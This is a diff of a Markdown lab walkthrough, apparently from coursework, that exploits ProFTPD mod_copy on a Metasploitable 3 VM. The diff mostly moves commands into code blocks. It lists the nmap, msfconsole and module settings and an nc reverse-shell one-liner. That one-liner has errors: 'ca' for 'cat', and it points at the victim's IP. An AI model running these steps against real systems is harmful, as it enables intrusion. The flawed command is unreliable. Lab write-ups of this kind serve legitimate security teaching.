@@ -24,7 +24,7 @@ This guide is created **strictly for educational purposes** within the scope of 
 ### Setup Steps
 
 1. **Download and then launch the imported Metasploitable 3 VM**  
-   `https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/`  
+   [Metasploitable3 Ubuntu 14.04 Upgraded Version](https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/)  
 
 2. **Login:**  
    Username: `vagrant`  
@@ -36,27 +36,38 @@ This guide is created **strictly for educational purposes** within the scope of 
 ## Attacker Environment: Kali Linux
 
 ### Initial Setup & Updates  
-`sudo apt update && sudo apt upgrade -y`
-
+ ```bash
+   sudo apt update && sudo apt upgrade -y
+   ```
 ---
 
 ## Ensuring Connectivity Between VMs
 
 ### Get victim machine IP:  
-Run inside Metasploitable3: `ipconfig`
+Run inside Metasploitable3:
+```bash
+ipconfig
+```
 
 ### Get attacker machine IP:  
-Run inside Kali: `ip a`
+Run inside Kali:
+```bash
+ip a
+```
 
-### Test connectivity:  
-`ping 192.168.56.101`   
+### Test connectivity: 
+```bash
+ping 192.168.56.101   
+```
 
 ![image](https://github.com/user-attachments/assets/2277bcbe-8b33-4d3e-b34e-4a36e0c0e326)
 
 ---
 
 ## Port Scanning with Nmap  
-`nmap -sV 192.168.56.101`
+```bash
+nmap -sV 192.168.56.101
+```
 
 Sample Output Snippet:
 
@@ -73,41 +84,66 @@ Due to its history of vulnerabilities and real-world relevance , we selected **f
 
 ## Exploitation using Metasploit
 
-### Launch Metasploit Console:  
-`sudo msfconsole`
+### Launch Metasploit Console: 
+```bash
+sudo msfconsole
+```
 
 ### Search services available for exploitation:
-`search proftpd`
+```bash
+search proftpd
+```
 
 ![image](https://github.com/user-attachments/assets/ec755932-aafb-48a2-b310-7f6655256c60)
 
 
 ### Load ftp Exploit Module:  
-`use exploit/unix/ftp/proftpd_modcopy_exec`
+```bash
+use exploit/unix/ftp/proftpd_modcopy_exec
+```
+
 
 ### Check required options for exploitation:  
-`show options`
+```bash
+show options
+```
+
 
 ![image](https://github.com/user-attachments/assets/081249f6-fa57-4fc0-9be2-f3dab5b0690e)
 
 
 ### Set required options:  
-`set RHOSTS 192.168.56.101`  
-`set SITEPATH /var/www/html`   
-`set AllowNoCleanup true`
+```bash
+set RHOSTS 192.168.56.101  
+set SITEPATH /var/www/html   
+set AllowNoCleanup true
+```
 
 ### Check and select an available payload:  
-`show payloads`
-`set payload cmd/unix/generic`
+```bash
+show payloads
+```
 
-### Check required options for payload:  
-`show payload options`
+```bash
+set payload cmd/unix/generic
+```
+
+![image](https://github.com/user-attachments/assets/9fab42b1-3257-4d65-9c92-2ceae54f8546)
+
+
+### Check required options for payload: 
+```bash
+show payload options
+```
 
 ![image](https://github.com/user-attachments/assets/45ea9953-3f70-4c0b-b52e-459e4520024a)
 
 
 ### Set required payload options:    
-`set cmd rm /tmp/f;mkfifo /tmp/f; ca /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f`
+```bash
+set cmd rm /tmp/f;mkfifo /tmp/f; ca /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f
+```
+
 
 ### Start listening from the victim machine:
 
@@ -115,7 +151,9 @@ Due to its history of vulnerabilities and real-world relevance , we selected **f
 
 
 ### Exploit!  
-`run`
+```bash
+run
+```
 
 ### Verify access:
 
@@ -159,7 +197,7 @@ We wrote a **Python script** to automate the attack for demonstration.
 | Service enumeration (Nmap)  |  Done      |
 | Metasploit attack           |  Success   |
 | Custom script creation      |  Tested    |
-| Screenshots and documentation | Attached |
+| Screenshots, script, and documentation | Attached |
 
 ---
 
